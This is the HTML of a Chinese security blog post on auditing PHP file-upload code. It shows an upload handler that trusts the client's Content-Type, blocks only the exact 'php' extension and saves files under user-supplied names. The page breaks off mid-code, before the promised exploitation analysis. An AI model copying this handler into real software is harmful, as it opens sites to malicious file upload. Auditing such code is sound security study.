<!DOCTYPE html><html><head><meta name="google-site-verification" content="1ia5dGzRACgefl6X6Bop8RyCADGr5_2t_cPSC6VuVos"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="robots" content="index,follow"><meta name="description" content="#0X00-简单源码分析0X00 简单源码分析 123456789101112131415161718192021222324252627282930313233343536373839   0)		      //返回上传错误码    {    echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&quot;;    }  else"><meta name="keywords" content="代码审计,上传分析"><meta property="og:type" content="article"><meta property="og:title" content="尽最大可能分析上传源码及漏洞利用方式"><meta property="og:url" content="https://hackfun.org/2017/03/03/尽最大可能分析上传源码及漏洞利用方式/index.html"><meta property="og:site_name" content="Hackfun"><meta property="og:description" content="#0X00-简单源码分析0X00 简单源码分析 123456789101112131415161718192021222324252627282930313233343536373839   0)		      //返回上传错误码    {    echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&quot;;    }  else"><meta property="og:updated_time" content="2017-10-03T05:53:56.013Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="尽最大可能分析上传源码及漏洞利用方式"><meta name="twitter:description" content="#0X00-简单源码分析0X00 简单源码分析 123456789101112131415161718192021222324252627282930313233343536373839   0)		      //返回上传错误码    {    echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&quot;;    }  else"><meta name="twitter:creator" content="@jinglingbiaodi"><link rel="publisher" href="https://plus.google.com/117450799036676139034"><meta property="fb:admins" content="jinglingbiaodi"><meta property="fb:app_id" content="jinglingbiaodi"><link rel="shortcut icon" href="../../../../images/favicon.ico"><link rel="icon" type="image/png" href="../../../../images/favicon-192x192.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="../../../../images/apple-touch-icon.png"><title>尽最大可能分析上传源码及漏洞利用方式</title><link rel="stylesheet" href="../../../../css/style.css"><link rel="alternate" href="../../../../atom.xml" title="Hackfun - | Secblog | Pentest | Auditing | Sectool | CTF Write-up" type="application/atom+xml"></head><body><div id="header-post"><a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; $(&quot;html, body&quot;).animate({scrollTop:0},&quot;fast&quot;)" style="display:none" data-cf-modified-2e4904e9c9ec2c3d24c6d64f-><i class="fa fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about/index.html">About</a></li><li><a href="../../../../link/index.html">Link</a></li><li><a href="../../../../tags/kali-linux/index.html">Kali</a></li><li><a href="../../../../archives/index.html">Archives</a></li><li><a href="https://github.com/sunnyelf">Projects</a></li><li><a href="../../../../search/index.html">Search</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" href="../../16/%E6%B5%85%E6%9E%90%E5%BC%B1%E5%8F%A3%E4%BB%A4/index.html"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="if (!window.__cfRLUnblockHandlers) return false; $(&quot;#i-prev&quot;).toggle()" onmouseout="if (!window.__cfRLUnblockHandlers) return false; $(&quot;#i-prev&quot;).toggle()" data-cf-modified-2e4904e9c9ec2c3d24c6d64f-></i></a></li><li><a class="icon" href="../../../02/28/%E4%B8%80%E9%81%93%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90CTF%E9%A2%98%E7%9B%AE/index.html"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="if (!window.__cfRLUnblockHandlers) return false; $(&quot;#i-next&quot;).toggle()" onmouseout="if (!window.__cfRLUnblockHandlers) return false; $(&quot;#i-next&quot;).toggle()" data-cf-modified-2e4904e9c9ec2c3d24c6d64f-></i></a></li><li><a class="icon" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; $(&quot;html, body&quot;).animate({scrollTop:0},&quot;fast&quot;)" data-cf-modified-2e4904e9c9ec2c3d24c6d64f-><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="if (!window.__cfRLUnblockHandlers) return false; $(&quot;#i-top&quot;).toggle()" onmouseout="if (!window.__cfRLUnblockHandlers) return false; $(&quot;#i-top&quot;).toggle()" data-cf-modified-2e4904e9c9ec2c3d24c6d64f-></i></a></li><li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="if (!window.__cfRLUnblockHandlers) return false; $(&quot;#i-share&quot;).toggle()" onmouseout="if (!window.__cfRLUnblockHandlers) return false; $(&quot;#i-share&quot;).toggle()" onclick="if (!window.__cfRLUnblockHandlers) return false; return $(&quot;#share&quot;).toggle(),!1" data-cf-modified-2e4904e9c9ec2c3d24c6d64f-></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" href="https://www.facebook.com/sharer.php?u=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"><i class="fa fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" href="https://twitter.com/share?url=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&amp;text=%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><i class="fa fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&amp;title=%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&amp;is_video=false&amp;description=%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><i class="fa fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="../../../../cdn-cgi/l/email-protection.html#59662a2c3b333c3a2d64bce9e4bfc5d9bcfdfebcd6f6b1dae4bcd1dfbfc7c9bde1d3bde5f9bfe3c9bef9d8bcd6d3bfe5d6bfedc7bcd1f0becdf1bfcfe0bce5d67f3b363d20641a313c3a3279362c2d792d31302a79382b2d303a353c6379312d2d292a63767631383a323f2c3777362b3e766b69686e76696a76696a76bce9e4bfc5d9bcfdfebcd6f6b1dae4bcd1dfbfc7c9bde1d3bde5f9bfe3c9bef9d8bcd6d3bfe5d6bfedc7bcd1f0becdf1bfcfe0bce5d676"><i class="fa fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" href="https://getpocket.com/save?url=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&amp;title=%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><i class="fa fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" href="http://reddit.com/submit?url=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&amp;title=%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><i class="fa fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&amp;title=%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><i class="fa fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" href="http://digg.com/submit?url=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&amp;title=%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><i class="fa fa-digg" aria-hidden="true"></i></a></li><li><a class="icon" href="https://www.tumblr.com/share/link?url=https://hackfun.org/2017/03/03/%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&amp;name=%E5%B0%BD%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8A%E4%BC%A0%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F&amp;description=%3Ch2%20id=%220x00-%E7%AE%80%E5%8D%95%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%22%3E%3Ca%20href=%22#0x00-%E7%AE%80%E5%8D%95%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%22%20class=%22headerlink%22%20title=%220x00%20%E7%AE%80%E5%8D%95%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%22%3E%3C/a%3E0x00%20%E7%AE%80%E5%8D%95%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%3C/h2%3E%3Cfigure%20class=%22highlight%20php%22%3E%3Ctable%3E%3Ctr%3E%3Ctd%20class=%22gutter%22%3E%3Cpre%3E%3Cdiv%20class=%22line%22%3E1%3C/div%3E%3Cdiv%20class=%22line%22%3E2%3C/div%3E%3Cdiv%20class=%22line%22%3E3%3C/div%3E%3Cdiv%20class=%22line%22%3E4%3C/div%3E%3Cdiv%20class=%22line%22%3E5%3C/div%3E%3Cdiv%20class=%22line%22%3E6%3C/div%3E%3Cdiv%20class=%22line%22%3E7%3C/div%3E%3Cdiv%20class=%22line%22%3E8%3C/div%3E%3Cdiv%20class=%22line%22%3E9%3C/div%3E%3Cdiv%20class=%22line%22%3E10%3C/div%3E%3Cdiv%20class=%22line%22%3E11%3C/div%3E%3Cdiv%20class=%22line%22%3E12%3C/div%3E%3Cdiv%20class=%22line%22%3E13%3C/div%3E%3Cdiv%20class=%22line%22%3E14%3C/div%3E%3Cdiv%20class=%22line%22%3E15%3C/div%3E%3Cdiv%20class=%22line%22%3E16%3C/div%3E%3Cdiv%20class=%22line%22%3E17%3C/div%3E%3Cdiv%20class=%22line%22%3E18%3C/div%3E%3Cdiv%20class=%22line%22%3E19%3C/div%3E%3Cdiv%20class=%22line%22%3E20%3C/div%3E%3Cdiv%20class=%22line%22%3E21%3C/div%3E%3Cdiv%20class=%22line%22%3E22%3C/div%3E%3Cdiv%20class=%22line%22%3E23%3C/div%3E%3Cdiv%20class=%22line%22%3E24%3C/div%3E%3Cdiv%20class=%22line%22%3E25%3C/div%3E%3Cdiv%20class=%22line%22%3E26%3C/div%3E%3Cdiv%20class=%22line%22%3E27%3C/div%3E%3Cdiv%20class=%22line%22%3E28%3C/div%3E%3Cdiv%20class=%22line%22%3E29%3C/div%3E%3Cdiv%20class=%22line%22%3E30%3C/div%3E%3Cdiv%20class=%22line%22%3E31%3C/div%3E%3Cdiv%20class=%22line%22%3E32%3C/div%3E%3Cdiv%20class=%22line%22%3E33%3C/div%3E%3Cdiv%20class=%22line%22%3E34%3C/div%3E%3Cdiv%20class=%22line%22%3E35%3C/div%3E%3Cdiv%20class=%22line%22%3E36%3C/div%3E%3Cdiv%20class=%22line%22%3E37%3C/div%3E%3Cdiv%20class=%22line%22%3E38%3C/div%3E%3Cdiv%20class=%22line%22%3E39%3C/div%3E%3C/pre%3E%3C/td%3E%3Ctd%20class=%22code%22%3E%3Cpre%3E%3Cdiv%20class=%22line%22%3E%3Cspan%20class=%22meta%22%3E%3C?php%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%3Cspan%20class=%22keyword%22%3Eif%3C/span%3E%20((($_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22type%22%3C/span%3E%5D%20==%20%3Cspan%20class=%22string%22%3E%22image/gif%22%3C/span%3E)%3Cspan%20class=%22comment%22%3E//%E6%A3%80%E6%B5%8BContent-type%E5%80%BC%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%7C%7C%20($_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22type%22%3C/span%3E%5D%20==%20%3Cspan%20class=%22string%22%3E%22image/jpeg%22%3C/span%3E)%3C/div%3E%3Cdiv%20class=%22line%22%3E%7C%7C%20($_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22type%22%3C/span%3E%5D%20==%20%3Cspan%20class=%22string%22%3E%22image/pjpeg%22%3C/span%3E))%3C/div%3E%3Cdiv%20class=%22line%22%3E&amp;&amp;%20($_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22size%22%3C/span%3E%5D%20%3C%20%3Cspan%20class=%22number%22%3E20000%3C/span%3E))%20%20%20%20%20%20%20%3Cspan%20class=%22comment%22%3E//%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%7B%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20$ext%20=%20end(explode(%3Cspan%20class=%22string%22%3E&apos;.&apos;%3C/span%3E,%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22name%22%3C/span%3E%5D));%20%20%3Cspan%20class=%22comment%22%3E//%E8%8E%B7%E5%8F%96%E6%9C%80%E5%90%8E%E2%80%9C.%E2%80%9D%E7%9A%84%E5%90%8E%E7%BC%80%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%3Cspan%20class=%22keyword%22%3Eif%3C/span%3E($ext%20===%20%3Cspan%20class=%22string%22%3E&apos;php&apos;%3C/span%3E)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class=%22comment%22%3E//%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E4%B8%BAphp%E5%90%8E%E7%BC%80%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%7B%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%3Cspan%20class=%22keyword%22%3Eexit%3C/span%3E(%3Cspan%20class=%22string%22%3E&apos;error&apos;%3C/span%3E);%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%7D%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%3Cspan%20class=%22keyword%22%3Eif%3C/span%3E%20($_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22error%22%3C/span%3E%5D%20%3E%20%3Cspan%20class=%22number%22%3E0%3C/span%3E)%20%20%20%20%20%20%3Cspan%20class=%22comment%22%3E//%E8%BF%94%E5%9B%9E%E4%B8%8A%E4%BC%A0%E9%94%99%E8%AF%AF%E7%A0%81%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%7B%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%3Cspan%20class=%22keyword%22%3Eecho%3C/span%3E%20%3Cspan%20class=%22string%22%3E%22Return%20Code:%20%22%3C/span%3E%20.%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22error%22%3C/span%3E%5D%20.%20%3Cspan%20class=%22string%22%3E%22%3Cbr%20/%3E%22%3C/span%3E;%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%7D%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%3Cspan%20class=%22keyword%22%3Eelse%3C/span%3E%3Cspan%20class=%22comment%22%3E//%E8%BF%94%E5%9B%9E%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%E4%BF%A1%E6%81%AF%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%7B%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%3Cspan%20class=%22keyword%22%3Eecho%3C/span%3E%20%3Cspan%20class=%22string%22%3E%22Upload:%20%22%3C/span%3E%20.%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22name%22%3C/span%3E%5D%20.%20%3Cspan%20class=%22string%22%3E%22%3Cbr%20/%3E%22%3C/span%3E;%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%3Cspan%20class=%22keyword%22%3Eecho%3C/span%3E%20%3Cspan%20class=%22string%22%3E%22Type:%20%22%3C/span%3E%20.%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22type%22%3C/span%3E%5D%20.%20%3Cspan%20class=%22string%22%3E%22%3Cbr%20/%3E%22%3C/span%3E;%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%3Cspan%20class=%22keyword%22%3Eecho%3C/span%3E%20%3Cspan%20class=%22string%22%3E%22Size:%20%22%3C/span%3E%20.%20($_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22size%22%3C/span%3E%5D%20/%20%3Cspan%20class=%22number%22%3E1024%3C/span%3E)%20.%20%3Cspan%20class=%22string%22%3E%22%20Kb%3Cbr%20/%3E%22%3C/span%3E;%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%3Cspan%20class=%22keyword%22%3Eecho%3C/span%3E%20%3Cspan%20class=%22string%22%3E%22Temp%20file:%20%22%3C/span%3E%20.%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22tmp_name%22%3C/span%3E%5D%20.%20%3Cspan%20class=%22string%22%3E%22%3Cbr%20/%3E%22%3C/span%3E;%3C/div%3E%3Cdiv%20class=%22line%22%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%3Cspan%20class=%22keyword%22%3Eif%3C/span%3E%20(file_exists(%3Cspan%20class=%22string%22%3E%22upload/%22%3C/span%3E%20.%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22name%22%3C/span%3E%5D))%20%20%3Cspan%20class=%22comment%22%3E//%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%20%20%7B%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%20%20%3Cspan%20class=%22keyword%22%3Eecho%3C/span%3E%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22name%22%3C/span%3E%5D%20.%20%3Cspan%20class=%22string%22%3E%22%20already%20exists.%20%22%3C/span%3E;%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%20%20%7D%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%3Cspan%20class=%22keyword%22%3Eelse%3C/span%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class=%22comment%22%3E//%E5%B0%86%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E8%BD%AC%E7%A7%BB%E5%88%B0%E6%8C%87%E5%AE%9A%E5%AD%98%E6%94%BE%E6%96%87%E4%BB%B6%E5%A4%B9%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%20%20%7B%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%20%20move_uploaded_file($_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22tmp_name%22%3C/span%3E%5D,%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%20%20%3Cspan%20class=%22string%22%3E%22upload/%22%3C/span%3E%20.%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22name%22%3C/span%3E%5D);%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%20%20%3Cspan%20class=%22keyword%22%3Eecho%3C/span%3E%20%3Cspan%20class=%22string%22%3E%22Stored%20in:%20%22%3C/span%3E%20.%20%3Cspan%20class=%22string%22%3E%22upload/%22%3C/span%3E%20.%20$_FILES%5B%3Cspan%20class=%22string%22%3E%22file%22%3C/span%3E%5D%5B%3Cspan%20class=%22string%22%3E%22name%22%3C/span%3E%5D;%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%20%20%7D%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%20%20%7D%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%7D%3C/div%3E%3Cdiv%20class=%22line%22%3E%3Cspan%20class=%22keyword%22%3Eelse%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%7B%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%3Cspan%20class=%22keyword%22%3Eecho%3C/span%3E%20%3Cspan%20class=%22string%22%3E%22Invalid%20file%22%3C/span%3E;%20%20%20%20%3Cspan%20class=%22comment%22%3E//%E8%BF%94%E5%9B%9E%E6%97%A0%E6%95%88%E6%96%87%E4%BB%B6%E7%9A%84%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%3C/span%3E%3C/div%3E%3Cdiv%20class=%22line%22%3E%20%20%7D%3C/div%3E%3Cdiv%20class=%22line%22%3E%3Cspan%20class=%22meta%22%3E?%3E%3C/span%3E%3C/div%3E%3C/pre%3E%3C/td%3E%3C/tr%3E%3C/table%3E%3C/figure%3E"><i class="fa fa-tumblr" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E7%AE%80%E5%8D%95%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">0x00 简单源码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">0x01 详细分析过程</span></a></li></ol></div></span></div><div class="content index width mx-auto px2 my4"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">尽最大可能分析上传源码及漏洞利用方式</h1><div class="meta"><span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><i class="fa fa-user-secret"></i><span itemprop="name">Jing Ling</span> </span><i class="fa fa-calendar"></i><div class="postdate"><time datetime="2017-03-02T20:19:00.000Z" itemprop="datePublished">2017-03-03</time></div><i class="fa fa-eye"></i><span id="busuanzi_container_site_pv"><span id="busuanzi_value_site_pv"></span></span><div class="article-tag"><i class="fa fa-tags"></i> <a class="tag-link" href="../../../../tags/%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90/index.html">上传分析</a>, <a class="tag-link" href="../../../../tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">代码审计</a></div></div></header><div class="content" itemprop="articleBody"><h2 id="0x00-简单源码分析"><a href="#0x00-%E7%AE%80%E5%8D%95%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90" class="headerlink" title="0x00 简单源码分析"></a>0x00 简单源码分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)		<span class="comment">//检测Content-type值</span></div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</div><div class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>))</div><div class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">20000</span>))		       <span class="comment">//检测文件大小</span></div><div class="line">  &#123;</div><div class="line">  $ext = end(explode(<span class="string">'.'</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]));  <span class="comment">//获取最后“.”的后缀</span></div><div class="line">  <span class="keyword">if</span>($ext === <span class="string">'php'</span>)  			              <span class="comment">//检测是否为php后缀</span></div><div class="line">  	&#123;</div><div class="line">    <span class="keyword">exit</span>(<span class="string">'error'</span>);</div><div class="line">    &#125;</div><div class="line">  <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)		      <span class="comment">//返回上传错误码</span></div><div class="line">    &#123;</div><div class="line">    <span class="keyword">echo</span> <span 